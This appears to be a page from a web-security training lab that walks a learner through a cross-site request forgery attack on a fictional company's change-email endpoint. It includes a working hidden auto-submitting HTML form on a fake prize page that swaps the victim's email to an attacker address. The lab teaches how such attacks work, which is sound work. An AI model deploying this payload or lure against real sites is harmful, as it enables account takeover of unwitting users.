🔁 CSRF Form

I-05  ·  /intermediate/csrf-form

// Scenario

NovaCorp's account settings page lets authenticated users change their email address. The form doesn't include a CSRF token — so any website can silently trigger this action on behalf of a logged-in user. You are the attacker: craft a hidden form on an "evil" page that submits to NovaCorp's endpoint. When the simulated admin visits your evil page, the action fires.

🏢 NovaCorp — Account Settings
Logged in as: admin@novacorp.com
⚠️ No CSRF token in this form. Any site can submit to this endpoint.
Change-email endpoint (no CSRF protection):
POST /account/change-email
Content-Type: application/x-www-form-urlencoded

email=newemail@attacker.com
// No csrf_token field! Any origin can submit this.
😈 evil-site.com/free-prizes.html
This simulates what an "evil" page looks like to the victim's browser.
🎁

You won a free iPhone!

Click Claim to get your prize

Hidden form on attacker page (view-source):
<!-- Hidden auto-submit form -->
<form id="csrf" method="POST" action="https://novacorp.com/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

Trigger the CSRF attack first from the Attacker Page tab.

💡 Hint Go to Attacker Page tab and click "Claim Prize". This simulates the victim (admin) loading the attacker's page, which auto-submits a cross-site form.
